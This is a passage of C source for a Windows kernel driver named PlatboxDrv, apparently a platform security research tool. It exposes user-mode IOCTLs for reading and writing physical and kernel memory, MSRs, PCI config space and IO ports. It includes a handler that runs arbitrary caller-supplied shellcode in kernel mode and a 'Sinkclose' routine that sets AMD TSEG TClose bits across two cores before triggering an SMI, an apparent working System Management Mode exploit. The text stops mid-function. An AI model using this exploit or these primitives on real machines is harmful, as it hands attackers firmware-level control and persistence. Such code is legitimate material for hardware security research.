#pragma once
#include "Platbox.h"
#include "CbHooks.h"
#include "intrin.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, IrpCloseHandler)
#pragma alloc_text(PAGE, IrpCreateHandler)
#pragma alloc_text(PAGE, IrpUnloadHandler)
#pragma alloc_text(PAGE, IrpDeviceIoCtlHandler)
#pragma alloc_text(PAGE, IrpNotImplementedHandler)
#endif

#define SINKCLOSE_CORE1_RECOVER_PHYSICAL_ADDR 0x3000
#define CORE1_FAKE_STATE_AREA 0x200
static PVOID SinkcloseCore1RecoverVaddr;

USER_MAPPED_MEM* g_root_user_mapped_mem = NULL;


PHYSICAL_ADDRESS GetPhysicalAddress(PVOID VirtualAddress) {
	PHYSICAL_ADDRESS physicalAddress = MmGetPhysicalAddress(VirtualAddress);
	return physicalAddress;
}


NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath) {
	UINT32 i = 0;
	PDEVICE_OBJECT DeviceObject = NULL;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	UNICODE_STRING DeviceName, DosDeviceName = { 0 };

	UNREFERENCED_PARAMETER(RegistryPath);
	PAGED_CODE();

	RtlInitUnicodeString(&DeviceName, L"\\Device\\PlatboxDev");
	RtlInitUnicodeString(&DosDeviceName, L"\\DosDevices\\PlatboxDev");

	// Create the device
	Status = IoCreateDevice(DriverObject,
		0,
		&DeviceName,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&DeviceObject);

	if (!NT_SUCCESS(Status)) {
		// Delete the device
		IoDeleteDevice(DriverObject->DeviceObject);

		DbgPrint("[-] Error during IoCreateDevice...\n");
		return Status;
	}

	// Assign the IRP handlers
	for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
		// Disable the Compiler Warning: 28169
#pragma warning(push)
#pragma warning(disable : 28169)
		DriverObject->MajorFunction[i] = IrpNotImplementedHandler;
#pragma warning(pop)
	}

	// Assign the IRP handlers for Create, Close and Device Control
	DriverObject->MajorFunction[IRP_MJ_CREATE] = IrpCreateHandler;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = IrpCloseHandler;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceIoCtlHandler;

	// Assign the driver Unload routine
	DriverObject->DriverUnload = IrpUnloadHandler;

	// Set the flags
	DeviceObject->Flags |= DO_BUFFERED_IO;
	DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

	// Create the symbolic link
	Status = IoCreateSymbolicLink(&DosDeviceName, &DeviceName);


	DbgPrint("[+] PlatboxDrv loaded!\n");

	return Status;
}

NTSTATUS IrpCreateHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {
	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = STATUS_SUCCESS;

	UNREFERENCED_PARAMETER(DeviceObject);
	PAGED_CODE();

	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS IrpCloseHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {
	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = STATUS_SUCCESS;

	UNREFERENCED_PARAMETER(DeviceObject);
	PAGED_CODE();

	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

VOID IrpUnloadHandler(IN PDRIVER_OBJECT DriverObject) {

	UNICODE_STRING DosDeviceName = { 0 };

	PAGED_CODE();

	if (g_root_user_mapped_mem != NULL) {
		USER_MAPPED_MEM* curr = g_root_user_mapped_mem;
		USER_MAPPED_MEM* next;
		while (curr != NULL) {
			next = curr->next;

			MmUnmapLockedPages(curr->user_address, curr->mdl);
			MmUnlockPages(curr->mdl);
			IoFreeMdl(curr->mdl);
			if (curr->is_allocation == TRUE) {
				ExFreePool(curr->kernel_va);
			}
			else {
				MmUnmapIoSpace(curr->kernel_va, PAGE_SIZE);
			}

			ExFreePool(curr);
			curr = next;
		}
	}

	RtlInitUnicodeString(&DosDeviceName, L"\\DosDevices\\PlatboxDev");

	// Delete the symbolic link
	IoDeleteSymbolicLink(&DosDeviceName);

	// Delete the device
	IoDeleteDevice(DriverObject->DeviceObject);

	DbgPrint("[-] PlatboxDrv Unloaded\n");
}

NTSTATUS IrpNotImplementedHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {
	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = STATUS_NOT_SUPPORTED;

	UNREFERENCED_PARAMETER(DeviceObject);
	PAGED_CODE();

	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_NOT_SUPPORTED;
}


NTSTATUS IrpDeviceIoCtlHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {
	ULONG IoControlCode = 0;
	PIO_STACK_LOCATION IrpSp = NULL;
	NTSTATUS Status = STATUS_NOT_SUPPORTED;

	UNREFERENCED_PARAMETER(DeviceObject);
	PAGED_CODE();

	IrpSp = IoGetCurrentIrpStackLocation(Irp);
	IoControlCode = IrpSp->Parameters.DeviceIoControl.IoControlCode;
	DbgPrint("[+] IOCTL Code: 0x%X\n", IoControlCode);
	//__debugbreak();
	if (IrpSp) {
		switch (IoControlCode) {
		case IOCTL_ISSUE_SW_SMI:
			Status = SendSWSmiHandler(Irp, IrpSp);
			break;
		case IOCTL_SINKCLOSE:
			Status = Sinkclose(Irp, IrpSp);
			break;
		case IOCTL_EXECUTE_SHELLCODE:
			Status = ExecuteShellcodeHandler(Irp, IrpSp);
			break;
		case IOCTL_READ_PCI_HEADER:
			Status = ReadPCIHeaderHandler(Irp, IrpSp);
			break;
		case IOCTL_READ_PCI_BYTE:
			Status = ReadPCIByte(Irp, IrpSp);
			break;
		case IOCTL_READ_PCI_WORD:
			Status = ReadPCIWord(Irp, IrpSp);
			break;
		case IOCTL_READ_PCI_DWORD:
			Status = ReadPCIDword(Irp, IrpSp);
			break;
		case IOCTL_WRITE_PCI_BYTE:
			Status = WritePCIByte(Irp, IrpSp);
			break;
		case IOCTL_WRITE_PCI_WORD:
			Status = WritePCIWord(Irp, IrpSp);
			break;
		case IOCTL_WRITE_PCI_DWORD:
			Status = WritePCIDword(Irp, IrpSp);
			break;
		case IOCTL_GET_PCI_BAR_SIZE:
			Status = ReadPCIBarSize(Irp, IrpSp);
			break;
		case IOCTL_READ_PHYSICAL_MEM:
			Status = ReadPhysicalMemory(Irp, IrpSp);
			break;
		case IOCTL_WRITE_PHYSICAL_MEM:
			Status = WritePhysicalMemory(Irp, IrpSp);
			break;
		case IOCTL_READ_MSR:
			Status = ReadMSR(Irp, IrpSp);
			break;
		case IOCTL_READ_MSR_FOR_CORE:
			Status = ReadMSRForCore(Irp, IrpSp);
			break;
		case IOCTL_WRITE_MSR:
			Status = WriteMSR(Irp, IrpSp);
			break;
		case IOCTL_WRITE_MSR_FOR_CORE:
			Status = WriteMSRForCore(Irp, IrpSp);
			break;
		case IOCTL_READ_IO_PORT:
			Status = ReadIOPort(Irp, IrpSp);
			break;
		case IOCTL_WRITE_IO_PORT:
			Status = WriteIOPort(Irp, IrpSp);
			break;
		case IOCTL_PATCH_CALLBACK:
			Status = PatchCallback(Irp, IrpSp);
			break;
		case IOCTL_RESTORE_CALLBACK:
			Status = RestoreCallback(Irp, IrpSp);
			break;
		case IOCTL_REMOVE_ALL_CALLBACKS_HOOKS:
			Status = RemoveAllCallbackHooks(Irp, IrpSp);
			break;
		case IOCTL_MAP_PHYSICAL_MEM:
			Status = MapPhysicalMemory(Irp, IrpSp);
			break;
		case IOCTL_UNMAP_PHYSICAL_MEM:
			Status = UnmapPhysicalMemory(Irp, IrpSp);
			break;
		case IOCTL_ALLOC_MEM:
			Status = AllocateUserMemory(Irp, IrpSp);
			break;
		case IOCTL_READ_KMEM:
			Status = ReadKMem(Irp, IrpSp);
			break;
		case IOCTL_WRITE_KMEM:
			Status = WriteKMem(Irp, IrpSp);
			break;
		case IOCTL_GET_PHYSICAL_RANGES:
			Status = GetPhysicalMemoryRanges(Irp, IrpSp);
			break;
		case IOCTL_GET_PHYSICAL_ADDRESS:
			Status = IoctlGetPhysicalAddress(Irp, IrpSp);
			break;
		case IOCTL_INDEX_IO_OPERATION:
			Status = IoctlIndexIO(Irp, IrpSp);
			break;
		default:
			DbgPrint("[-] Invalid IOCTL Code: 0x%X\n", IoControlCode);
			Status = STATUS_INVALID_DEVICE_REQUEST;
			Irp->IoStatus.Information = 0;
			break;
		}
	}

	Irp->IoStatus.Status = Status;
	// Complete the request
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return Status;
}


#pragma auto_inline(off)



NTSTATUS SendSWSmiHandler(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength == sizeof(SW_SMI_CALL)) {
		__try
		{
			_swsmi(Irp->AssociatedIrp.SystemBuffer);

			Status = STATUS_SUCCESS;
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			Status = GetExceptionCode();
		}
	}
	Irp->IoStatus.Information = 0;
	return Status;
}



long Core1StagingExecuted = 0;
long Core1StagingFinished = 0;
void Core1_Staging(IN PKDPC Dpc, IN PVOID DeferredContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2)
{
	// Set Core1StagingFinished to 0
	InterlockedAnd(&Core1StagingFinished, 0);

	// Signal core 0 that this is executing
	InterlockedIncrement(&Core1StagingExecuted);

	// Wait for core 0 to finish SMI
	while (InterlockedCompareExchange(&Core1StagingFinished, 1, 1) != 1);

	return;
}


long Core1SinkcloseExecuted = 0;
long Core1SinkcloseFinished = 0;
void Core1_Sinkclose(IN PKDPC Dpc, IN PVOID DeferredContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2)
{
	// Set SinkcloseCore1Finished to 0
	InterlockedAnd(&Core1SinkcloseFinished, 0);

	// Set RIP, RBP, RSP and CR3 into CORE1_FAKE_STATE_AREA
	_store_savestate((char *)SinkcloseCore1RecoverVaddr + CORE1_FAKE_STATE_AREA);

	// Signal core 0 that this is executing
	InterlockedIncrement(&Core1SinkcloseExecuted);

	// Wait for core 0 to finish SMI
	while (InterlockedCompareExchange(&Core1SinkcloseFinished, 1, 1) != 1);

	return;
}

#define AMD_MSR_SMM_TSEG_MASK  0xC0010113
long SinkcloseDpcExecuted = 0;
void SinkcloseExploit(IN PKDPC Dpc, IN PVOID DeferredContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2)
{
	UINT64 tseg_mask = 0;
	SW_SMI_CALL *Smi = (SW_SMI_CALL *)SystemArgument1;
	PKDPC pkdpc = NULL;

	if (Smi->rax == 0x31337)
	{
		// Set Core1StagingExecuted to 0
		InterlockedAnd(&Core1StagingExecuted, 0);

		pkdpc = (PKDPC)ExAllocatePool(NonPagedPool, sizeof(KDPC));
		KeInitializeDpc(pkdpc, Core1_Staging, NULL);
		KeSetTargetProcessorDpc(pkdpc, 1);

		// Schedule the callback to be executed on core 1 asynchronously
		KeInsertQueueDpc(pkdpc, NULL, NULL);

		// Busy wait until core 1 executes
		while (InterlockedCompareExchange(&Core1StagingExecuted, 1, 1) != 1);

		// Execute SMI
		// This is done to save the registers of core 0 and core 1 to SMM SAVE STATE
		_swsmi(Smi);

		// Signal core 1 that it can continue
		InterlockedIncrement(&Core1StagingFinished);
		ExFreePool(pkdpc);
	}

	// Triggered on second SMI
	if (Smi->rax == 0x31338)
	{
		// Set Core1SinkcloseExecuted to 0
		InterlockedAnd(&Core1SinkcloseExecuted, 0);

		pkdpc = (PKDPC)ExAllocatePool(NonPagedPool, sizeof(KDPC));
		KeInitializeDpc(pkdpc, Core1_Sinkclose, NULL);
		KeSetTargetProcessorDpc(pkdpc, 1);

		// Schedule the callback to be executed on core 1 asynchronously
		KeInsertQueueDpc(pkdpc, NULL, NULL);

		// Busy wait until core 1 executes
		while (InterlockedCompareExchange(&Core1SinkcloseExecuted, 1, 1) != 1);

		// Executes SMI with TClose enabled
		_rdmsr(AMD_MSR_SMM_TSEG_MASK, &tseg_mask);
        tseg_mask = tseg_mask | (0b11 << 2);
        _wrmsr(AMD_MSR_SMM_TSEG_MASK, tseg_mask);
		_swsmi(Smi);
		
		// Signal core 1 that it can continue
		InterlockedIncrement(&Core1SinkcloseFinished);

		ExFreePool(pkdpc);
	}

	InterlockedIncrement(&SinkcloseDpcExecuted);
}


NTSTATUS Sinkclose(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength == sizeof(SW_SMI_CALL)) {
		__try
		{
			// Map the recovery address for core 1
			PHYSICAL_ADDRESS SaveStatePa = { 0 };
			SaveStatePa.QuadPart = SINKCLOSE_CORE1_RECOVER_PHYSICAL_ADDR & ~(0xFFF);
			SinkcloseCore1RecoverVaddr = MmMapIoSpace(SaveStatePa, PAGE_SIZE, MmNonCached);

			PSW_SMI_CALL Buffer = (PSW_SMI_CALL)(Irp->AssociatedIrp.SystemBuffer);
			PKDPC pkdpc = NULL;

			// Set SinkcloseDpcExecuted to 0; will be set by core 0 when function finishes
			InterlockedAnd(&SinkcloseDpcExecuted, 0);

			// Schedule the callback to be executed on CPU 0 asynchronously
			pkdpc = (PKDPC)ExAllocatePool(NonPagedPool, sizeof(KDPC));
			KeInitializeDpc(pkdpc, SinkcloseExploit, NULL);
			KeSetTargetProcessorDpc(pkdpc, 0);

			// Notify core 1 and wait until DpcExecuted == 1
			KeInsertQueueDpc(pkdpc, Buffer, NULL);

			// Wait until core 0 finishes function
			while (InterlockedCompareExchange(&SinkcloseDpcExecuted, 1, 1) != 1);
			
			// Free resources
			ExFreePool(pkdpc);

			MmUnmapIoSpace(SinkcloseCore1RecoverVaddr, PAGE_SIZE);
			SinkcloseCore1RecoverVaddr = NULL;

			Status = STATUS_SUCCESS;
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			Status = GetExceptionCode();
		}
	}
	Irp->IoStatus.Information = 0;
	return Status;
}


NTSTATUS ExecuteShellcodeHandler(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	UINT32 inputLen = IrpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen > 0) {
		PVOID code_region = ExAllocatePool(
			NonPagedPoolExecute,
			inputLen);
		memmove(code_region, Irp->AssociatedIrp.SystemBuffer, inputLen);
		((void(*)(void))code_region)();
		ExFreePool(code_region);
		Status = STATUS_SUCCESS;

	}

	Irp->IoStatus.Information = 0;
	return Status;
}

NTSTATUS ReadPCIHeaderHandler(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();
	
	Irp->IoStatus.Information = 0;

	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(READ_PCI_CONFIGURATION_SPACE_CALL)) {
		if (IrpSp->Parameters.DeviceIoControl.OutputBufferLength >= 256) {
			PREAD_PCI_CONFIGURATION_SPACE_CALL p = (PREAD_PCI_CONFIGURATION_SPACE_CALL)Irp->AssociatedIrp.SystemBuffer;
			UINT8 bus = p->bus;
			UINT8 device = p->device;
			UINT8 function = p->function;
			memset(Irp->AssociatedIrp.SystemBuffer, 0x00, 256);
			_read_pci_compatible_configuration_space(bus, device, function, Irp->AssociatedIrp.SystemBuffer);
			Irp->IoStatus.Information = 256;
			Status = STATUS_SUCCESS;
		}
	}
		
	return Status;
}

NTSTATUS ReadPCIByte(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;

	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(READ_PCI_DATA_CALL)) {
		if (IrpSp->Parameters.DeviceIoControl.OutputBufferLength >= 1) {
			PREAD_PCI_DATA_CALL p = (PREAD_PCI_DATA_CALL)Irp->AssociatedIrp.SystemBuffer;
			UINT32 bus = p->bus;
			UINT32 device = p->device;
			UINT32 function = p->function;
			UINT32 offset = p->offset;
			UINT32 CF8 = ((1 << 0x1F) | (bus << 0x10) | (device << 0xB) | (function << 0x08) | (offset));
			memset(Irp->AssociatedIrp.SystemBuffer, 0x00, IrpSp->Parameters.DeviceIoControl.OutputBufferLength);
			_read_pci_byte(CF8, Irp->AssociatedIrp.SystemBuffer);
			Irp->IoStatus.Information = 1;
			Status = STATUS_SUCCESS;
		}
	}

	return Status;
}

NTSTATUS ReadPCIWord(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;

	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(READ_PCI_DATA_CALL)) {
		if (IrpSp->Parameters.DeviceIoControl.OutputBufferLength >= 2) {
			PREAD_PCI_DATA_CALL p = (PREAD_PCI_DATA_CALL)Irp->AssociatedIrp.SystemBuffer;
			UINT32 bus = p->bus;
			UINT32 device = p->device;
			UINT32 function = p->function;
			UINT32 offset = p->offset;
			UINT32 CF8 = ((1 << 0x1F) | (bus << 0x10) | (device << 0xB) | (function << 0x08) | (offset));
			memset(Irp->AssociatedIrp.SystemBuffer, 0x00, IrpSp->Parameters.DeviceIoControl.OutputBufferLength);
			_read_pci_word(CF8, Irp->AssociatedIrp.SystemBuffer);
			Irp->IoStatus.Information = 2;
			Status = STATUS_SUCCESS;
		}
	}

	return Status;
}

NTSTATUS ReadPCIDword(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;

	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(READ_PCI_DATA_CALL)) {
		if (IrpSp->Parameters.DeviceIoControl.OutputBufferLength >= 4) {
			PREAD_PCI_DATA_CALL p = (PREAD_PCI_DATA_CALL)Irp->AssociatedIrp.SystemBuffer;
			UINT32 bus = p->bus;
			UINT32 device = p->device;
			UINT32 function = p->function;
			UINT32 offset = p->offset;
			UINT32 CF8 = ((1 << 0x1F) | (bus << 0x10) | (device << 0xB) | (function << 0x08) | (offset));
			memset(Irp->AssociatedIrp.SystemBuffer, 0x00, IrpSp->Parameters.DeviceIoControl.OutputBufferLength);
			_read_pci_dword(CF8, Irp->AssociatedIrp.SystemBuffer);
			Irp->IoStatus.Information = 4;
			Status = STATUS_SUCCESS;
		}
	}

	return Status;
}

NTSTATUS WritePCIByte(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;

	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(WRITE_PCI_DATA_CALL)) {
		PWRITE_PCI_DATA_CALL p = (PWRITE_PCI_DATA_CALL)Irp->AssociatedIrp.SystemBuffer;
		UINT32 bus = p->bus;
		UINT32 device = p->device;
		UINT32 function = p->function;
		UINT32 offset = p->offset;
		UINT32 CF8 = ((1 << 0x1F) | (bus << 0x10) | (device << 0xB) | (function << 0x08) | (offset));
		__try {
			_write_pci_byte(CF8, p->value);
			Status = STATUS_SUCCESS;
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {

		}
	}

	return Status;
}

NTSTATUS WritePCIWord(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;

	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(WRITE_PCI_DATA_CALL)) {
		PWRITE_PCI_DATA_CALL p = (PWRITE_PCI_DATA_CALL)Irp->AssociatedIrp.SystemBuffer;
		UINT32 bus = p->bus;
		UINT32 device = p->device;
		UINT32 function = p->function;
		UINT32 offset = p->offset;
		UINT32 CF8 = ((1 << 0x1F) | (bus << 0x10) | (device << 0xB) | (function << 0x08) | (offset));
		__try {
			_write_pci_word(CF8, p->value);
			Status = STATUS_SUCCESS;
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {

		}
	}

	return Status;
}

NTSTATUS WritePCIDword(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;

	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(WRITE_PCI_DATA_CALL)) {		
		PWRITE_PCI_DATA_CALL p = (PWRITE_PCI_DATA_CALL)Irp->AssociatedIrp.SystemBuffer;
		UINT32 bus = p->bus;
		UINT32 device = p->device;
		UINT32 function = p->function;
		UINT32 offset = p->offset;
		UINT32 CF8 = ((1 << 0x1F) | (bus << 0x10) | (device << 0xB) | (function << 0x08) | (offset));
		__try {
			_write_pci_dword(CF8, p->value);
			Status = STATUS_SUCCESS;
		}
		__except(EXCEPTION_EXECUTE_HANDLER) {

		}
		
	}

	return Status;
}

NTSTATUS ReadPCIBarSize(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;

	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(READ_PCI_DATA_CALL)) {
		if (IrpSp->Parameters.DeviceIoControl.OutputBufferLength >= sizeof(PVOID)) {
			PREAD_PCI_DATA_CALL p = (PREAD_PCI_DATA_CALL)Irp->AssociatedIrp.SystemBuffer;
			UINT32 bus = p->bus;
			UINT32 device = p->device;
			UINT32 function = p->function;
			UINT32 offset = p->offset;
			UINT32 CF8 = ((1 << 0x1F) | (bus << 0x10) | (device << 0xB) | (function << 0x08) | (offset));
			memset(Irp->AssociatedIrp.SystemBuffer, 0x00, IrpSp->Parameters.DeviceIoControl.OutputBufferLength);
			_read_pci_bar_size(CF8, Irp->AssociatedIrp.SystemBuffer);
			Irp->IoStatus.Information = sizeof(PVOID);
			Status = STATUS_SUCCESS;
		}
	}

	return Status;
}

NTSTATUS ReadPhysicalMemory(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;

	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(READ_PHYSICAL_MEM_CALL)) {
		if (IrpSp->Parameters.DeviceIoControl.OutputBufferLength >= 1) {
			UINT32 read_size = IrpSp->Parameters.DeviceIoControl.OutputBufferLength;
			PREAD_PHYSICAL_MEM_CALL p = (PREAD_PHYSICAL_MEM_CALL)Irp->AssociatedIrp.SystemBuffer;
			PVOID va = MmMapIoSpace(p->address, read_size, MmNonCached);
			if (va) {
				memmove(Irp->AssociatedIrp.SystemBuffer, va, read_size);
				MmUnmapIoSpace(va, read_size);
				Irp->IoStatus.Information = read_size;
				Status = STATUS_SUCCESS;
			}
		}
	}

	return Status;
}

NTSTATUS WritePhysicalMemory(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;

	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(WRITE_PHYSICAL_MEM_CALL)) {					
		PWRITE_PHYSICAL_MEM_CALL p = (PWRITE_PHYSICAL_MEM_CALL) Irp->AssociatedIrp.SystemBuffer;
		if (p->size <= sizeof(p->data)) {
			PVOID va = MmMapIoSpace(p->address, p->size, MmNonCached);
			if (va) {
				memmove(va, p->data, p->size);
				MmUnmapIoSpace(va, p->size);
				Status = STATUS_SUCCESS;
			}
		}			
	}

	return Status;
}

NTSTATUS ReadMSR(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;
	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(READ_MSR_CALL)) {
		if (IrpSp->Parameters.DeviceIoControl.OutputBufferLength >= sizeof(DWORD64)) {
			PREAD_MSR_CALL p = (PREAD_MSR_CALL)Irp->AssociatedIrp.SystemBuffer;
			__try {
				_rdmsr(p->msr, Irp->AssociatedIrp.SystemBuffer);
				Irp->IoStatus.Information = sizeof(DWORD64);
				Status = STATUS_SUCCESS;
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {
				*(DWORD64 *)Irp->AssociatedIrp.SystemBuffer = 0xFFFFFFFFFFFFFFFF;
				Irp->IoStatus.Information = sizeof(DWORD64);
				Status = STATUS_SUCCESS;
			}
		}
	}
	return Status;
}

long ReadMsrForCoreExecuted = 0;
void ReadMsrForCoreCallback(IN PKDPC Dpc, IN PVOID DeferredContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2)
{
	PREAD_MSR_FOR_CORE_CALL Buffer = (PREAD_MSR_FOR_CORE_CALL)SystemArgument1;

	// Read the MSR
	_rdmsr(Buffer->msr, &Buffer->result);
	
	// Signal the caller that the callback is finished
	InterlockedIncrement(&ReadMsrForCoreExecuted);
}

NTSTATUS ReadMSRForCore(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;
	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(READ_MSR_FOR_CORE_CALL)) {
		if (IrpSp->Parameters.DeviceIoControl.OutputBufferLength >= sizeof(DWORD64)) {
			PREAD_MSR_FOR_CORE_CALL Buffer = (PREAD_MSR_FOR_CORE_CALL)Irp->AssociatedIrp.SystemBuffer;
			__try {
				PKDPC pkdpc = NULL;

				// Set SinkcloseDpcExecuted to 0; will be set by core 0 when function finishes
				InterlockedAnd(&ReadMsrForCoreExecuted, 0);

				// Schedule the callback to be executed on CPU 0 asynchronously
				pkdpc = (PKDPC)ExAllocatePool(NonPagedPool, sizeof(KDPC));
				KeInitializeDpc(pkdpc, ReadMsrForCoreCallback, NULL);
				KeSetTargetProcessorDpc(pkdpc, Buffer->core_id);

				// Schedule on core X
				KeInsertQueueDpc(pkdpc, Buffer, NULL);

				// Wait until core 0 finishes function
				while (InterlockedCompareExchange(&ReadMsrForCoreExecuted, 1, 1) != 1);
				
				// Free resources
				ExFreePool(pkdpc);

				DWORD64 tmp = Buffer->result;
				*(DWORD64 *)Irp->AssociatedIrp.SystemBuffer = tmp;
				Irp->IoStatus.Information = sizeof(DWORD64);
				Status = STATUS_SUCCESS;
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {
				*(DWORD64 *)Irp->AssociatedIrp.SystemBuffer = 0xFFFFFFFFFFFFFFFF;
				Irp->IoStatus.Information = sizeof(DWORD64);
				Status = STATUS_SUCCESS;
			}
		}
	}
	return Status;
}

NTSTATUS WriteMSR(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;
	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(WRITE_MSR_CALL)) {
		PWRITE_MSR_CALL p = (PWRITE_MSR_CALL)Irp->AssociatedIrp.SystemBuffer;
		__try {
			_wrmsr(p->msr, p->value);
			Status = STATUS_SUCCESS;
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {

		}

	}
	return Status;
}


long WriteMsrForCoreExecuted = 0;
void WriteMsrForCoreCallback(IN PKDPC Dpc, IN PVOID DeferredContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2)
{
	PWRITE_MSR_FOR_CORE_CALL Buffer = (PWRITE_MSR_FOR_CORE_CALL)SystemArgument1;

	// Write the MSR
	_wrmsr(Buffer->msr, Buffer->value);
	
	// Signal the caller that the callback is finished
	InterlockedIncrement(&WriteMsrForCoreExecuted);
}

NTSTATUS WriteMSRForCore(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;
	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(WRITE_MSR_FOR_CORE_CALL)) {		
		PWRITE_MSR_FOR_CORE_CALL Buffer = (PWRITE_MSR_FOR_CORE_CALL)Irp->AssociatedIrp.SystemBuffer;
		__try {
			PKDPC pkdpc = NULL;

			// Set WriteMsrForCoreExecuted to 0; will be set by core 0 when function finishes
			InterlockedAnd(&WriteMsrForCoreExecuted, 0);

			// Schedule the callback to be executed on CPU 0 asynchronously
